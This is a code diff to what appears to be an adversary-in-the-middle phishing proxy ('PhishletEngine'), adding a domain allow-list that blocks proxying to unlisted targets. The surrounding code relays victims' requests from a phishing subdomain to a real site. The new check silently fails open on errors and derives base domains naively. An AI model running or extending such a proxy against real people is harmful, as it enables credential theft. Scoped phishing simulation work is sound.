@@ -24,6 +24,7 @@ class PhishletEngine:
         self.landing_path = self.config.get('login', {}).get('path', '/')
         self.target_domain = self.config.get('login', {}).get('domain', '')
         self.name = self.config.get('name', 'Unknown')
+        self.allowed_domains = self._load_allowed_domains()
 
     def _load_config(self) -> Dict[str, Any]:
         if not os.path.exists(self.phishlet_path):
@@ -31,6 +32,15 @@ class PhishletEngine:
             return {}
         with open(self.phishlet_path, 'r') as f:
             return yaml.safe_load(f)
+
+    def _load_allowed_domains(self) -> List[str]:
+        wl_env = os.getenv("WHITELIST_DOMAINS", "")
+        wl_cfg = self.config.get("allowed_domains", [])
+        domains = set([d.strip().lower() for d in wl_cfg if isinstance(d, str)])
+        if wl_env:
+            for d in wl_env.split(","):
+                domains.add(d.strip().lower())
+        return sorted(list(domains))
 
     def get_target_url(self, subdomain: str, path: str) -> str:
         # Simplified logic: find the domain associated with the subdomain
@@ -154,6 +164,16 @@ async def proxy(request: Request, path: str):
     host = request.url.hostname or ""
     phish_sub = host.split(".")[0] if host else "www"
     target_url = engine.get_target_url(phish_sub, f"/{path}")
+    # Enforce domain whitelist
+    try:
+        # Extract domain from target_url (strip scheme and sub)
+        domain_part = target_url.split("://", 1)[-1].split("/")[0]
+        base_domain = ".".join(domain_part.split(".")[-2:]).lower()
+        if engine.allowed_domains and base_domain not in engine.allowed_domains:
+            logger.warning(f"Blocked target domain {base_domain} not in whitelist: {engine.allowed_domains}")
+            return Response("Forbidden: domain not allowed", status_code=403)
+    except Exception:
+        pass
     
     logger.info(f"Proxying {request.method} /{path} -> {target_url}")
 
